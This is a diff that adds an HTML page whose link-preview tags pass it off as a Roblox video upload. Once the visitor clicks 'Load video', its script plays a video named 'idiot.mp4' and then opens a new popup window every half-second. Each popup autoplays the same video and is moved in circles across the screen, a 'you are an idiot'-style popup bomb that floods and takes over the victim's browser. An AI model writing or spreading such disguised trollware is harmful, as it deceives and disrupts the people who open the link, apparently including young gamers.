@@ -1,0 +1,52 @@
+<html>
+
+<head>
+  <title>Upload</title>
+   <meta property="og:site_name" content="mau-api">
+<meta property="og:url" content="https://mau-api.tk">
+<meta property="og:title" content="Video upload - robloxapp-20210208-20383623.wmv">
+<meta name="theme-color" content="#0x0000ff">
+<meta name="theme-color" content="#0000ff">
+<meta property="og:type" content="website">
+  <meta name="og:image" itemprop="image" content="https://mau-api.tk/cdn/logo">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body>
+
+  <button id="c">Load video</button>
+  <video src="https://mau-api.tk/cdn/idiot.mp4" loop id="vi" style="display: none; width:500px; height:300px;">
+  <script>
+    var a = document.getElementById("c")
+    var b = document.getElementById("vi")
+    a.addEventListener("click", function(){
+    a.style.display="none"
+      b.style.display="block"
+      b.play()
+      setInterval(function(){
+        var to 
+        var x = 0
+        var y = 0
+        var speed = 12
+        var wh = ((screen.height-300)/2)+250
+        var ww = (screen.width-500)/4
+function lerp (start, end, amt){
+  return (1-amt)*start+amt*end;
+}
+var inc = 0
+ var windo = window.open("about:blank", "", "_blank")
+        windo.document.write(`  <video src="https://mau-api.tk/cdn/idiot.mp4" loop id="vi" autoplay style=" width:500px; height:300px;"> <script>window.onload => vi.play()</script>`)
+        windo.document.close()
+      setInterval(function(){
+        inc+=1
+        if (inc>=9e9) inc=1
+        windo.resizeTo(500, 300)
+        windo.moveTo(lerp(wh, 700*Math.cos(inc/speed), .1),lerp(ww, 700*Math.sin(inc/speed), .1))
+      }, 10)
+      }, 500)
+    })
+    </script>
+
+</body>
+
+</html>
